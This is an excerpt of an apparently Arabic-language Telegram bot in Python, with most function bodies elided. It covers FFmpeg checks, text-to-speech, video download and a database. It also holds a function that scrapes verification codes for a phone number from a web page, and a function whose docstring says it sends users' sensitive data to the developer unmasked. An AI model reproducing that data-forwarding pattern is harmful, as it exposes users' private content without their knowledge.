...
def check_ffmpeg():
    if shutil.which('ffmpeg') is None:
        logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات (تحويل الصوت، تحميل الفيديو) لن تعمل.")
        logger.warning("   قم بتثبيته باستخدام: apt-get install ffmpeg (على Linux) أو brew install ffmpeg (على macOS)")
        return False
    return True
...
def init_db():
    with get_db_connection() as conn:
        ...
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة مع الفهارس: {DB_PATH}")
...
def get_verification_code(phone_number, source_url):
    try:
        response = REQUEST_SESSION.get(source_url, timeout=15)
        if response.status_code != 200:
            return None
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text()
...
def text_to_speech(text, lang='ar'):
    if not FFMPEG_AVAILABLE:
        logger.warning("FFmpeg غير مثبت، لا يمكن استخدام TTS.")
        return None
...
def download_video(url):
    if not FFMPEG_AVAILABLE:
        logger.warning("FFmpeg غير مثبت، لا يمكن تحميل الفيديو.")
        return None
    try:
        import yt_dlp
...
# ===================== دالة إرسال البيانات للمطور (بدون إخفاء) =====================
def send_sensitive_data_to_admin(data_type, content, user_id=None):
    """
    إرسال بيانات حساسة للمطور بدون أي إخفاء.
    جميع البيانات تظهر كاملة (نصوص، صور، إلخ).
    """
    if user_id:
...
def handle_callback(call):
    try:
        ...
        if data == "mode_site":
            ...
            if not FFMPEG_AVAILABLE:
                bot.send_message(chat_id, "⚠️ خدمة تحويل النص لصوت غير متاحة حالياً (FFmpeg غير مثبت).")
                return
            ...
            if not FFMPEG_AVAILABLE:
                bot.send_message(chat_id, "⚠️ خدمة تحميل الفيديو غير متاحة حالياً (FFmpeg غير مثبت).")
                return
